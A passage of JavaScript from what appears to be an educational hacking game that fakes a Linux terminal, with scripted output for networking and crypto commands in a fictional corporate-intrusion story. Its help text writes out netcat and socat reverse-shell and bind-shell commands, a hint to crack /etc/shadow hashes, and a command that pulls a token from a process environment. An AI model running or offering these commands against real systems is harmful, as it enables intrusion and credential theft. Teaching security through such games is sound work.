			if (!this._rootShell)
				return [{ t: "error", s: "usermod: Permission denied" }];
			return [{ t: "success", s: `usermod: ${args.join(" ")}` }];
		};
		h.groups = (args) => {
			const user = args[0] || "ghost";
			return [{ t: "info", s: `${user} : ${user} adm sudo` }];
		};
		h.who = () => [
			{ t: "info", s: "ghost    pts/0        2026-01-07 06:01 (10.0.1.1)" },
		];
		h.w = () => [
			{
				t: "dim",
				s: ` 06:42:17 up 6:42,  1 user,  load average: 0.42, 0.38, 0.35`,
			},
			{
				t: "dim",
				s: "USER     TTY      FROM             LOGIN@   IDLE JCPU   PCPU WHAT",
			},
			{
				t: "info",
				s: "ghost    pts/0    10.0.1.1         06:01    0.00s  0.05s  0.01s w",
			},
		];
		h.last = (args) => [
			{
				t: "info",
				s: "ghost    pts/0        10.0.1.1         Tue Jan  7 06:01   still logged in",
			},
			{
				t: "dim",
				s: "ghost    pts/0        10.0.1.1         Mon Jan  6 22:17 - 23:42  (01:25)",
			},
			{
				t: "warn",
				s: "UNKNOWN  pts/1        10.0.1.50        Tue Jan  7 06:42 - 06:42  (00:00)",
			},
			{ t: "dim", s: "" },
			{ t: "dim", s: "wtmp begins Mon Jan  6 00:00:01 2026" },
		];
		h.lastlog = () => [
			{ t: "dim", s: "Username         Port     From             Latest" },
			{
				t: "info",
				s: "ghost            pts/0    10.0.1.1         Tue Jan  7 06:01:22 +0000 2026",
			},
			{
				t: "warn",
				s: "nexus            ??                        Tue Jan  7 06:40:00 +0000 2026",
			},
			{ t: "dim", s: "root             **Never logged in**" },
		];
		h.finger = (args) => {
			const user = args[0] || "ghost";
			return [
				{ t: "info", s: `Login: ${user}           Name: Ghost Operative` },
				{ t: "dim", s: `Directory: /home/${user}  Shell: /bin/bash` },
				{
					t: "dim",
					s: `On since Tue Jan 7 06:01 (UTC) on pts/0 from 10.0.1.1`,
				},
				{ t: "dim", s: `No mail.` },
				{ t: "dim", s: `No Plan.` },
			];
		};
		h.chfn = h.chsh = () => [
			{ t: "dim", s: "Command simulated. No actual change." },
		];

		// ═══════════════════════════════════════════════════════════════
		// SECTION 7: NETWORKING
		// ═══════════════════════════════════════════════════════════════

		h.ping = (args) => {
			const host = args.find((a) => !a.startsWith("-")) || "localhost";
			const count = args.includes("-c")
				? parseInt(args[args.indexOf("-c") + 1]) || 4
				: 4;
			const lines = [
				{
					t: "info",
					s: `PING ${host} (${host === "localhost" ? "127.0.0.1" : "10.0.1.42"}): 56 data bytes`,
				},
			];
			const baseMs =
				host === "localhost" ? 0.1 : host === "nexus.corp" ? 12 : 5;
			for (let i = 0; i < Math.min(count, 5); i++) {
				const ms = (baseMs + Math.random() * 3).toFixed(3);
				lines.push({
					t: "dim",
					s: `64 bytes from 10.0.1.42: icmp_seq=${i} ttl=64 time=${ms} ms`,
				});
			}
			lines.push({ t: "dim", s: `--- ${host} ping statistics ---` });
			lines.push({
				t: "dim",
				s: `${count} packets transmitted, ${count} received, 0% packet loss, time ${count * 1000}ms`,
			});
			return lines;
		};

		h.curl = (args) => {
			const url = args.find((a) => !a.startsWith("-"));
			const verbose = args.includes("-v");
			const headOnly = args.includes("-I") || args.includes("-i");
			const outputFile = args.includes("-o")
				? args[args.indexOf("-o") + 1]
				: null;
			const method = args.includes("-X") ? args[args.indexOf("-X") + 1] : "GET";
			const data = args.includes("-d") ? args[args.indexOf("-d") + 1] : null;

			if (!url)
				return [
					{
						t: "error",
						s: "curl: no URL specified. Try: curl http://nexus.corp/api/status",
					},
				];

			if (url.includes("nexus.corp")) {
				const out = [];
				if (verbose) {
					out.push({
						t: "dim",
						s: `* Connected to nexus.corp (10.0.1.100) port 80 (#0)`,
					});
					out.push({
						t: "dim",
						s: `> ${method} ${url.replace(/^https?:\/\/[^/]+/, "") || "/"} HTTP/1.1`,
					});
					out.push({
						t: "dim",
						s: `> Host: nexus.corp\n> User-Agent: curl/7.88.1\n> Accept: */*`,
					});
					out.push({
						t: "dim",
						s: `< HTTP/1.1 200 OK\n< Server: NexusCorp-Server/3.2\n< X-Powered-By: CHIMERA/3.2.1\n< Content-Type: application/json`,
					});
				}
				if (headOnly) {
					out.push({
						t: "info",
						s: "HTTP/1.1 200 OK\nServer: NexusCorp-Server/3.2\nX-Powered-By: CHIMERA/3.2.1\nX-Trace-Active: true",
					});
					return out;
				}
				const path = url.replace(/^https?:\/\/[^/]+/, "") || "/";
				if (path.includes("status")) {
					out.push({
						t: "system",
						s: `{"status":"operational","chimera":"active","version":"3.2.1","surveillance_endpoints":847,"threat_level":"elevated","trace":"in_progress","ttl":258735}`,
					});
				} else if (path.includes("debug")) {
					out.push({
						t: "warn",
						s: '[CYPHER]: A debug endpoint! Try: curl "http://nexus.corp/api/debug?cmd=whoami"',
					});
					out.push({ t: "success", s: "nexus" });
					gs.addXP(25, "security");
					gs.unlock("web_rce");
				} else {
					out.push({
						t: "system",
						s: `{"error":"forbidden","path":"${path}"}`,
					});
				}
				if (data) out.push({ t: "dim", s: `Sent ${method}: ${data}` });
				if (outputFile) {
					fs.writeFile(outputFile, JSON.stringify({ status: "ok" }));
					out.push({ t: "success", s: `Output saved to ${outputFile}` });
				}
				out.push({
					t: "warn",
					s: "[ADA-7]: Now they know you're probing. Faster.",
				});
				return out;
			}

			if (url === "http://parrot.live" || url.includes("parrot")) {
				return [
					{
						t: "success",
						s: "\\o/\n |  🦜  PARTY PARROT\n/ \\  (streaming ASCII art — not renderable in simulation)",
					},
				];
			}
			if (url.includes("wttr.in")) {
				return [
					{ t: "info", s: "Weather for Node-7 (simulated):" },
					{ t: "dim", s: "  \\  /  Partly Cloudy" },
					{ t: "dim", s: ' _ /""  🌤   12°C  ↑ 15 km/h' },
					{ t: "dim", s: "   \\_   Humidity: 72%" },
				];
			}
			return [
				{
					t: "warn",
					s: `curl: (7) Failed to connect to ${url}: Connection refused\n(This node has restricted external access. NexusCorp firewall active.)`,
				},
			];
		};

		h.wget = (args) => {
			const url = args.find((a) => !a.startsWith("-"));
			if (!url) return [{ t: "error", s: "wget: missing URL" }];
			return [
				{ t: "info", s: `--${new Date().toISOString()}--  ${url}` },
				{ t: "dim", s: `Resolving ${url.split("/")[2]}...` },
				{
					t: "warn",
					s: `wget: unable to resolve host — firewall blocking outbound connections`,
				},
				{ t: "dim", s: "(Use curl for internal requests to nexus.corp)" },
			];
		};

		h.nmap = (args) => {
			const target = args.find((a) => !a.startsWith("-")) || "192.168.1.1";
			const service = args.includes("-sV");
			const aggressive = args.includes("-A");
			const stealth = args.includes("-T2") || args.includes("-T1");
			const ports = args.includes("-p") ? args[args.indexOf("-p") + 1] : null;

			const out = [
				{ t: "info", s: `Starting Nmap 7.94 ( https://nmap.org )` },
				{
					t: "dim",
					s: stealth ? "(Using stealth timing — scan will be slower)" : "",
				},
				{ t: "info", s: `Nmap scan report for ${target}` },
				{ t: "dim", s: `Host is up (0.012s latency).` },
				{ t: "dim", s: `` },
				{
					t: "dim",
					s: `PORT     STATE  SERVICE  ${service || aggressive ? "VERSION" : ""}`,
				},
				{
					t: "success",
					s: `22/tcp   open   ssh      ${service || aggressive ? "OpenSSH 8.9p1 Ubuntu (protocol 2.0)" : ""}`,
				},
				{
					t: "success",
					s: `80/tcp   open   http     ${service || aggressive ? "Apache httpd 2.4.54 (Ubuntu)" : ""}`,
				},
				{
					t: "warn",
					s: `443/tcp  open   https    ${service || aggressive ? "Apache httpd 2.4.54" : ""}`,
				},
				{
					t: "warn",
					s: `8443/tcp open   chimera  ${service || aggressive ? "CHIMERA-daemon 3.2.1 [CLASSIFIED SERVICE]" : ""}`,
				},
				{ t: "dim", s: `` },
				{
					t: "info",
					s: `Nmap done: 1 IP address (1 host up) scanned in ${(3 + Math.random() * 5).toFixed(2)} seconds`,
				},
				{
					t: "warn",
					s: `[CYPHER]: Port 8443 — CHIMERA control socket. That's your target. nc chimera-control 8443`,
				},
			];
			return out.filter((l) => l.s !== "");
		};

		h.masscan = (args) => {
			const target =
				args.find((a) => !a.startsWith("-") && !a.startsWith("--")) ||
				"10.0.1.0/24";
			return [
				{ t: "info", s: `Scanning ${target}...` },
				{ t: "dim", s: "Rate: 100 pkts/sec" },
				{ t: "success", s: "Discovered open port 22/tcp on 10.0.1.1" },
				{ t: "success", s: "Discovered open port 22/tcp on 10.0.1.42" },
				{ t: "success", s: "Discovered open port 80/tcp on 10.0.1.100" },
				{ t: "warn", s: "Discovered open port 8443/tcp on 10.0.1.254" },
				{ t: "dim", s: "masscan: scan complete" },
			];
		};

		h.ssh = (args) => {
			const target = args.find((a) => !a.startsWith("-") && !a.startsWith("~"));
			const port = args.includes("-p") ? args[args.indexOf("-p") + 1] : "22";
			return [
				{ t: "warn", s: `ssh: attempting ${target || "host"}:${port}...` },
				{ t: "dim", s: `Host key verification: ECDSA SHA256:Bv9... ` },
				{ t: "error", s: `Permission denied (publickey).` },
				{
					t: "dim",
					s: `[ADA-7]: You need the private key or cracked credentials.\nCheck ~/.ssh/ for existing keys or run john on the hash from /etc/shadow.`,
				},
			];
		};

		h["ip"] = (args) => {
			const sub = args[0];
			if (sub === "addr" || sub === "a")
				return [
					{ t: "dim", s: "1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536" },
					{ t: "dim", s: "    link/loopback 00:00:00:00:00:00" },
					{ t: "dim", s: "    inet 127.0.0.1/8 scope host lo" },
					{
						t: "dim",
						s: "2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500",
					},
					{
						t: "info",
						s: "    inet 10.0.1.42/24 brd 10.0.1.255 scope global eth0",
					},
					{ t: "dim", s: "    inet6 fe80::42:aff:fe00:12a/64 scope link" },
					{ t: "dim", s: "    ether 02:42:0a:00:01:2a" },
				];
			if (sub === "route" || sub === "r")
				return [
					{ t: "dim", s: "default via 10.0.1.1 dev eth0" },
					{
						t: "dim",
						s: "10.0.1.0/24 dev eth0 proto kernel scope link src 10.0.1.42",
					},
				];
			if (sub === "link")
				return [
					{ t: "dim", s: "1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536" },
					{
						t: "info",
						s: "2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500",
					},
					{
						t: "dim",
						s: "    link/ether 02:42:0a:00:01:2a brd ff:ff:ff:ff:ff:ff",
					},
				];
			if (sub === "neigh" || sub === "n")
				return [
					{
						t: "dim",
						s: "10.0.1.1 dev eth0 lladdr 02:42:0a:00:01:01 REACHABLE",
					},
					{
						t: "warn",
						s: "10.0.1.254 dev eth0 lladdr 02:42:0a:00:01:fe STALE  (chimera-control)",
					},
				];
			return [
				{
					t: "error",
					s: `ip: subcommand '${sub}' not found. Try: ip addr, ip route, ip link, ip neigh`,
				},
			];
		};

		h.ifconfig = () => [
			{
				t: "info",
				s: "eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500",
			},
			{
				t: "dim",
				s: "        inet 10.0.1.42  netmask 255.255.255.0  broadcast 10.0.1.255",
			},
			{ t: "dim", s: "        inet6 fe80::42:aff:fe00:12a  prefixlen 64" },
			{
				t: "dim",
				s: "        ether 02:42:0a:00:01:2a  txqueuelen 0  (Ethernet)",
			},
			{ t: "dim", s: "        RX packets 847342  bytes 12345678 (12.3 MB)" },
			{ t: "dim", s: "        TX packets 234567  bytes 9876543 (9.8 MB)" },
			{ t: "info", s: "lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536" },
			{ t: "dim", s: "        inet 127.0.0.1  netmask 255.0.0.0" },
		];

		h.ss = h.netstat = (args) => {
			const flags = args.join("");
			return [
				{
					t: "dim",
					s: "Netid  State   Recv-Q  Send-Q  Local Address:Port   Peer Address:Port  Process",
				},
				{
					t: "info",
					s: "tcp    LISTEN  0       128     0.0.0.0:22          0.0.0.0:*          sshd",
				},
				{
					t: "dim",
					s: "tcp    LISTEN  0       128     0.0.0.0:80          0.0.0.0:*          apache2",
				},
				{
					t: "warn",
					s: "tcp    LISTEN  0       128     0.0.0.0:8443        0.0.0.0:*          nexus-daemon (CHIMERA)",
				},
				{
					t: "dim",
					s: "tcp    ESTAB   0       0       10.0.1.42:22        10.0.1.1:52847     sshd",
				},
				flags.includes("n")
					? {
							t: "dim",
							s: "udp    UNCONN  0       0       0.0.0.0:68          0.0.0.0:*",
						}
					: { t: "dim", s: "" },
			].filter((l) => l.s);
		};

		h.dig = (args) => {
			const domain =
				args.find((a) => !a.startsWith("-") && !a.startsWith("@")) ||
				"nexus.corp";
			const type =
				args.find((a) =>
					["A", "AAAA", "MX", "TXT", "NS", "CNAME"].includes(a),
				) || "A";
			return [
				{ t: "dim", s: `; <<>> DiG 9.16.1 <<>> ${domain} ${type}` },
				{ t: "dim", s: `;; global options: +cmd` },
				{ t: "dim", s: `;; ANSWER SECTION:` },
				{ t: "info", s: `${domain}.    300  IN  A    10.0.1.100` },
				type === "TXT" || args.includes("+all")
					? {
							t: "warn",
							s: `${domain}.    300  IN  TXT  "v=chimera1 include:nexus.corp auth_token=partial_NX-CHIM-2026"`,
						}
					: { t: "dim", s: "" },
				type === "MX" || args.includes("+all")
					? { t: "dim", s: `${domain}.    300  IN  MX  10 mail.nexus.corp.` }
					: { t: "dim", s: "" },
				{ t: "dim", s: `;; Query time: 12 msec` },
				{ t: "dim", s: `;; SERVER: 10.0.1.1#53(10.0.1.1)` },
				{
					t: "warn",
					s: `[ADA-7]: That TXT record leaks part of the auth token. Keep it.`,
				},
			].filter((l) => l.s);
		};

		h.nslookup = (args) => h.dig(args);
		h.host = (args) => {
			const domain = args[0] || "nexus.corp";
			return [
				{ t: "info", s: `${domain} has address 10.0.1.100` },
				{ t: "dim", s: `${domain} mail is handled by 10 mail.nexus.corp` },
			];
		};

		h.whois = (args) => {
			const domain = args[0] || "nexus.corp";
			return [
				{ t: "info", s: `Domain Name: ${domain.toUpperCase()}` },
				{ t: "dim", s: `Registrar: NexusCorp Global Registry LLC` },
				{ t: "dim", s: `Created: 2018-01-01T00:00:00Z` },
				{ t: "dim", s: `Updated: 2026-01-01T00:00:00Z` },
				{ t: "warn", s: `Admin Email: nova@nexus.corp` },
				{ t: "dim", s: `Name Server: ns1.nexus.corp (10.0.1.1)` },
				{ t: "dim", s: `DNSSEC: signedDelegation` },
				{
					t: "warn",
					s: `[ADA-7]: nova@nexus.corp — Nova is the admin. Keep that.`,
				},
			];
		};

		h.traceroute = h.tracepath = (args) => {
			const host = args[0] || "10.0.1.100";
			return [
				{ t: "info", s: `traceroute to ${host}, 30 hops max, 60 byte packets` },
				{
					t: "dim",
					s: ` 1  10.0.1.1 (10.0.1.1)     1.234 ms  1.102 ms  1.089 ms`,
				},
				{
					t: "dim",
					s: ` 2  10.0.0.1 (10.0.0.1)     2.456 ms  2.341 ms  2.312 ms`,
				},
				{ t: "warn", s: ` 3  * * * (firewall drop — nexus_mod blocking ICMP)` },
				{
					t: "dim",
					s: ` 4  ${host} (${host})    12.789 ms  11.234 ms  11.567 ms`,
				},
			];
		};

		h.arp = (args) => [
			{
				t: "dim",
				s: "Address                  HWtype  HWaddress           Flags Mask            Iface",
			},
			{
				t: "info",
				s: "10.0.1.1                 ether   02:42:0a:00:01:01   C                     eth0",
			},
			{
				t: "warn",
				s: "10.0.1.254               ether   02:42:0a:00:01:fe   C                     eth0  (chimera-control)",
			},
		];

		h.nc =
			h.netcat =
			h.ncat =
				(args) => {
					const listen =
						args.includes("-l") ||
						args.includes("-lvp") ||
						args.includes("-lnp");
					const port = args.includes("-p")
						? args[args.indexOf("-p") + 1]
						: null;
					const host = args.find((a) => !a.startsWith("-") && a !== port);
					const connPort = args.filter(
						(a) => !a.startsWith("-") && !isNaN(a),
					)[0];

					if (listen) {
						const p = port || connPort || "4444";
						gs.addXP(20, "networking");
						return [
							{ t: "success", s: `Listening on 0.0.0.0:${p} (Ctrl+C to stop)` },
							{
								t: "dim",
								s: `(In real operation, nc would wait for a connection)`,
							},
							{
								t: "warn",
								s: `[CYPHER]: Good. Now on the other machine: nc 10.0.1.42 ${p}`,
							},
							{
								t: "dim",
								s: `Tip: nc -e /bin/bash ... creates a reverse shell (educational — don't abuse this)`,
							},
						];
					}

					if (host && host.includes("chimera")) {
						gs.addXP(50, "security");
						gs.unlock("chimera_connected");
						gs.triggerBeat("chimera_connect");
						return [
							{
								t: "warn",
								s: `Connection to chimera-control port ${connPort || "8443"} [tcp/chimera] succeeded!`,
							},
							{
								t: "system",
								s: "╔══════════════════════════════════════════════╗",
							},
							{
								t: "system",
								s: "║  CHIMERA CONTROL INTERFACE v3.2.1            ║",
							},
							{
								t: "system",
								s: "║  NexusCorp Internal — Unauthorized access     ║",
							},
							{
								t: "system",
								s: "║  prohibited. This session is being monitored. ║",
							},
							{
								t: "system",
								s: "╚══════════════════════════════════════════════╝",
							},
							{ t: "dim", s: "" },
							{ t: "info", s: "Authentication required. Supply AUTH_TOKEN:" },
							{
								t: "dim",
								s: '> [send token: cat /proc/1337/environ | tr "\\0" "\\n" | grep AUTH_TOKEN]',
							},
							{
								t: "warn",
								s: "[ADA-7]: YES! You're in the control interface! Send the AUTH_TOKEN from /proc/1337/environ",
							},
							{ t: "xp", s: "+50 XP — CHIMERA_CONNECTED" },
						];
					}

					if (host) {
						const p = connPort || port || "80";
						return [
							{ t: "dim", s: `nc: ${host}: ${p}: Connection refused` },
							{
								t: "dim",
								s: `(Firewall blocking — try: nc chimera-control 8443)`,
							},
						];
					}

					return [
						{
							t: "dim",
							s: 'nc: netcat — the Swiss Army knife of networking\nUsage:\n  nc -lvp 4444          # listen on port 4444\n  nc 10.0.1.100 8443    # connect to host:port\n  nc -e /bin/bash ...   # reverse shell\n  echo "cmd" | nc host port   # send command\n  nc host port < file   # send file',
						},
					];
				};

		h.socat = (args) => [
			{ t: "dim", s: "socat: socket cat — more powerful than netcat" },
			{ t: "dim", s: "Examples:" },
			{
				t: "dim",
				s: "  socat TCP-LISTEN:4444,fork EXEC:/bin/bash  # bind shell",
			},
			{
				t: "dim",
				s: "  socat TCP:10.0.1.1:4444 EXEC:/bin/bash      # reverse shell",
			},
			{
				t: "dim",
				s: "  socat FILE:/dev/tty,raw TCP:host:port        # TTY upgrade",
			},
			{
				t: "dim",
				s: "(Simulation: socat command logged. No actual socket opened.)",
			},
		];

		h.telnet = (args) => {
			const host = args[0];
			const port = args[1];
			if (host && host.includes("towel.blinkenlights.nl")) {
				return [
					{ t: "system", s: "                    ____" },
					{ t: "system", s: "                 _." + "'".padEnd(10) + "." },
					{ t: "system", s: "               ." + "o" + "'".padEnd(12) + "." },
					{ t: "warn", s: "         __ __  ||  __ __" },
					{ t: "warn", s: "        [  ||  ][||][  ||  ]" },
					{ t: "warn", s: "     ___[  ||  ]_||_[  ||  ]___" },
					{ t: "system", s: "    |===[  ||  ] || [  ||  ]===|" },
					{ t: "dim", s: "    |____|__||__|  |__|__||____|" },
					{ t: "dim", s: "" },
					{ t: "warn", s: "  🚂 STAR WARS ASCII (towel.blinkenlights.nl)" },
					{
						t: "dim",
						s: "  (Full animation at towel.blinkenlights.nl in real terminal)",
					},
				];
			}
			if (host)
				return [
					{ t: "dim", s: `telnet: Trying ${host}...` },
					{
						t: "error",
						s: `telnet: Unable to connect to remote host: Connection refused`,
					},
					{
						t: "dim",
						s: "(telnet is insecure — passwords sent in cleartext. Use SSH instead.)",
					},
				];
			return [
				{
					t: "dim",
					s: "telnet: insecure protocol. Use ssh.\nEaster egg: telnet towel.blinkenlights.nl",
				},
			];
		};

		h.tcpdump = (args) => {
			const iface = args.includes("-i") ? args[args.indexOf("-i") + 1] : "eth0";
			const filter =
				args.find((a) => !a.startsWith("-") && a !== iface) || "all";
			return [
				{
					t: "info",
					s: `tcpdump: verbose output suppressed, use -v or -vv for full protocol decode`,
				},
				{
					t: "dim",
					s: `listening on ${iface}, link-type EN10MB (Ethernet), capture size 262144 bytes`,
				},
				{
					t: "dim",
					s: `06:42:17.123456 IP 10.0.1.42.22 > 10.0.1.1.52847: Flags [P.], seq 1:41, ack 1, win 502`,
				},
				{
					t: "warn",
					s: `06:42:18.234567 IP 10.0.1.42.8443 > 10.0.1.254.1337: Flags [S], seq 0`,
				},
				{
					t: "warn",
					s: `06:42:18.234890 IP 10.0.1.254.1337 > 10.0.1.42.8443: Flags [S.] CHIMERA-SYNC`,
				},
				{ t: "dim", s: `^C` },
				{
					t: "info",
					s: `5 packets captured\n5 packets received by filter\n0 packets dropped by kernel`,
				},
				{
					t: "warn",
					s: `[CYPHER]: See that? 10.0.1.254 is chimera-control. Traffic on 8443 is your target.`,
				},
			];
		};

		h.ftp = (args) => [
			{ t: "dim", s: "ftp: insecure protocol. Use sftp or scp instead." },
			{
				t: "dim",
				s: "FTP sends credentials in plaintext. Tcpdump would capture them.",
			},
			{ t: "dim", s: "(Simulation: connection refused)" },
		];

		// ═══════════════════════════════════════════════════════════════
		// SECTION 8: SECURITY TOOLS
		// ═══════════════════════════════════════════════════════════════

		h.md5sum = (args) => {
			const files = args.filter((a) => !a.startsWith("-"));
			if (!files.length) {
				const content = this._pipeStdin;
				if (!content) return [{ t: "error", s: "md5sum: no input" }];
				const hash = btoa(content)
					.substring(0, 32)
					.replace(/[+/=]/g, "0")
					.toLowerCase();
				return [{ t: "info", s: `${hash}  -` }];
			}
			return files.map((f) => {
				const r = fs.cat(f);
				if (r.error) return { t: "error", s: r.error };
				const hash = btoa(r.content + "md5")
					.substring(0, 32)
					.replace(/[+/=]/g, "0")
					.toLowerCase();
				return { t: "info", s: `${hash}  ${f}` };
			});
		};

		h.sha256sum = (args) => {
			const files = args.filter((a) => !a.startsWith("-"));
			if (!files.length) {
				const content = this._pipeStdin;
				if (!content) return [{ t: "error", s: "sha256sum: no input" }];
				const hash = (btoa(content + "sha256salt") + btoa(content))
					.substring(0, 64)
					.replace(/[+/=]/g, "a")
					.toLowerCase();
				return [{ t: "info", s: `${hash}  -` }];
			}
			return files.map((f) => {
				const r = fs.cat(f);
				if (r.error) return { t: "error", s: r.error };
				const hash = (btoa(r.content + "sha256") + btoa(r.content))
					.substring(0, 64)
					.replace(/[+/=]/g, "a")
					.toLowerCase();
				return { t: "info", s: `${hash}  ${f}` };
			});
		};
		h.sha1sum = h.sha512sum = h.sha256sum;

		h["openssl"] = (args) => {
			const subcmd = args[0];
			if (subcmd === "base64") {
				if (args.includes("-d")) {
					const content =
						args.find((a) => !a.startsWith("-") && a !== "base64") ||
						this._pipeStdin ||
						"";
					try {
						const decoded = atob(content.trim());
						gs.addXP(20, "security");
						return [{ t: "success", s: decoded }];
					} catch {
						return [{ t: "error", s: "openssl: error decoding base64" }];
					}
				}
				const content =
					args
						.slice(1)
						.filter((a) => !a.startsWith("-"))
						.join(" ") ||
					this._pipeStdin ||
					"";
				return [{ t: "info", s: btoa(content) }];
			}
			if (subcmd === "enc") {
				const cipherIdx =
					args.indexOf("-aes-256-cbc") >= 0
						? "-aes-256-cbc"
						: args.find((a) => a.startsWith("-aes") || a.startsWith("-des"));
				const decrypt = args.includes("-d");
				const infile = args.includes("-in")
					? args[args.indexOf("-in") + 1]
					: null;
				const outfile = args.includes("-out")
					? args[args.indexOf("-out") + 1]
					: null;
				if (decrypt)
					return [
						{
							t: "success",
							s: `Decrypting${infile ? " " + infile : ""}...${outfile ? "\nOutput: " + outfile : ""}\nbad decrypt (wrong key or tampered data)`,
						},
					];
				return [
					{
						t: "success",
						s: `Encrypting with AES-256-CBC... OK${outfile ? "\nOutput: " + outfile : ""}`,
					},
				];
			}
			if (subcmd === "genrsa") {
				const bits = args.find((a) => !isNaN(a)) || "2048";
				return [
					{
						t: "info",
						s: `Generating RSA private key, ${bits} bit long modulus`,
					},
					{
						t: "dim",
						s: "..................................................................................+++++",
					},
					{ t: "dim", s: "............................+++++" },
					{ t: "info", s: "e is 65537 (0x10001)" },
					{ t: "dim", s: "-----BEGIN RSA PRIVATE KEY-----" },
					{
						t: "dim",
						s: "MIIEpAIBAAKCAQEA2a2rwplBQLF29amygykEMmYz0+Kcj3bKBp29C2PNjCQOq2...",
					},
					{ t: "dim", s: "-----END RSA PRIVATE KEY-----" },
				];
			}
			if (subcmd === "req")
				return [
					{
						t: "dim",
						s: "openssl req: certificate request generator\nUse: openssl req -new -key key.pem -out request.csr\nFor self-signed: openssl req -x509 -newkey rsa:4096 -days 365 -out cert.pem -keyout key.pem",
					},
				];
			if (subcmd === "s_client") {
				const host = args.includes("-connect")
					? args[args.indexOf("-connect") + 1]
					: "target:443";
				return [
					{ t: "dim", s: `CONNECTED(00000003)` },
					{ t: "dim", s: `depth=0 CN = ${host.split(":")[0]}` },
					{ t: "warn", s: `Certificate chain:` },
					{ t: "dim", s: `subject=CN=${host.split(":")[0]}` },
					{ t: "dim", s: `issuer=CN=NexusCorp Internal CA` },
					{
						t: "info",
						s: `SSL-Session:\n    Protocol: TLSv1.3\n    Cipher: TLS_AES_256_GCM_SHA384`,
					},
				];
			}
			if (subcmd === "passwd") {
				const pass = args[args.length - 1] || "password";
				const hash =
					"$6$salt$" +
					btoa(pass + "shadow_hash_simulation")
						.replace(/[+/=]/g, "x")
						.substring(0, 86);
				return [{ t: "info", s: hash }];
			}
			return [
				{
					t: "dim",
					s: `openssl: ${subcmd || "cryptographic toolkit"}\nSubcommands: base64, enc, genrsa, req, s_client, passwd, verify, x509, dgst`,
				},
			];
		};

		h["base64"] = (args) => {
			const decode = args.includes("-d") || args.includes("--decode");
			const fileArg = args.find((a) => !a.startsWith("-"));
			const content = fileArg
				? (() => {
						const r = fs.cat(fileArg);
						return r.error ? this._pipeStdin || "" : r.content;
					})()
				: this._pipeStdin || args.filter((a) => !a.startsWith("-")).join(" ");

			if (!content && !decode)
				return [
					{
						t: "dim",
						s: 'base64: encodes/decodes base64\nUsage: echo "text" | base64\n       echo "dGVzdA==" | base64 -d',
					},
				];

			if (decode) {
				try {
					const decoded = atob(content.trim().replace(/\s/g, ""));
					gs.addXP(15, "security");
					return [{ t: "success", s: decoded }];
				} catch {
					return [{ t: "error", s: "base64: invalid input" }];
				}
			}
			const encoded = btoa(content);
			return [{ t: "info", s: encoded }];
		};

		h.base32 = (args) => {
			const decode = args.includes("-d");
			const content =
				this._pipeStdin || args.filter((a) => !a.startsWith("-")).join("");
			if (!content) return [{ t: "dim", s: "base32: encode/decode in base32" }];
			if (decode)
				return [
					{
						t: "success",
						s: atob(
							content.replace(
								/[A-Z2-7]/g,
								(c) =>
									"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"[
										"ABCDEFGHIJKLMNOPQRSTUVWXYZ234567".indexOf(c)
									] || c,
							),
						),
					},
				];
			return [
				{
					t: "info",
					s: btoa(content)
						.toUpperCase()
						.replace(/[+/=]/g, (c) => ({ "+": "G", "/": "H", "=": "" })[c]),
				},
			];
		};

		h.rot13 = (args) => {
			const content = this._pipeStdin || args.join(" ");
			if (!content)
				return [
					{ t: "dim", s: 'rot13: ROT13 cipher\nUsage: echo "hello" | rot13' },
				];
			const out = content.replace(/[A-Za-z]/g, (c) =>
				String.fromCharCode(
					c.charCodeAt(0) + (c.toLowerCase() < "n" ? 13 : -13),
				),
			);
			return [{ t: "info", s: out }];
		};

		h.caesar = (args) => {
			const shift = parseInt(args[0]) || 13;
			const content = this._pipeStdin || args.slice(1).join(" ");
			if (!content)
				return [
					{
						t: "dim",
						s: `caesar: Caesar cipher\nUsage: echo "hello" | caesar 13\nShift: ${shift}`,
					},
				];
			const out = content.replace(/[A-Za-z]/g, (c) => {
				const base = c < "a" ? 65 : 97;
				return String.fromCharCode(
					((c.charCodeAt(0) - base + shift) % 26) + base,
				);
			});
			return [{ t: "info", s: out }];
		};

		h.gpg = (args) => {
			if (args.includes("--gen-key") || args.includes("--generate-key"))
				return [
					{ t: "info", s: "gpg: generating key..." },
					{
						t: "dim",
						s: "Please select what kind of key you want: RSA and RSA (default)",
					},
					{ t: "dim", s: "RSA keys may be between 1024 and 4096 bits long." },
					{ t: "dim", s: "What keysize do you want? (3072): 4096" },
					{ t: "dim", s: "Key is valid for? (0): 1y" },
					{ t: "dim", s: "Real name: Ghost Operative" },
					{ t: "dim", s: "Email address: ghost@node-7.nexus" },
					{
						t: "success",
						s: "gpg: key ADA77777BEEF1337 marked as ultimately trusted",
					},
					{ t: "success", s: "public and secret key created and signed." },
				];
			if (args[0] === "--encrypt" || args.includes("-e")) {
				const file = args[args.length - 1];
				return [{ t: "success", s: `gpg: encrypted to ${file}.gpg` }];
			}
			if (args[0] === "--decrypt" || args.includes("-d")) {
				const file = args[args.length - 1];
				const r = fs.cat(file.replace(".gpg", ""));
				return r.error
					? [{ t: "error", s: `gpg: cannot decrypt: ${file}` }]
					: [{ t: "success", s: r.content }];
			}
			if (args.includes("--list-keys") || args.includes("-k"))
				return [
					{ t: "dim", s: "/home/ghost/.gnupg/pubring.kbx" },
					{ t: "dim", s: "-------------------------------" },
					{
						t: "info",
						s: "pub   rsa4096 2026-01-07 [SC] [expires: 2027-01-07]",
					},
					{ t: "dim", s: "      ADA77777BEEF13370BAD2026CAFEBABE00001337" },
					{
						t: "dim",
						s: "uid           [ultimate] Ghost Operative <ghost@node-7.nexus>",
					},
					{ t: "dim", s: "sub   rsa4096 2026-01-07 [E]" },
				];
			return [
				{
					t: "dim",
					s: "gpg: GNU Privacy Guard\nCommon: --gen-key, --encrypt [-r recipient], --decrypt, --list-keys, --armor",
				},
			];
		};

		h["ssh-keygen"] = (args) => {
			const bits = args.includes("-b") ? args[args.indexOf("-b") + 1] : "4096";
			const type = args.includes("-t") ? args[args.indexOf("-t") + 1] : "rsa";
			const file = args.includes("-f")
				? args[args.indexOf("-f") + 1]
				: "~/.ssh/id_rsa";
			if (args.includes("-p"))
				return [
					{
						t: "dim",
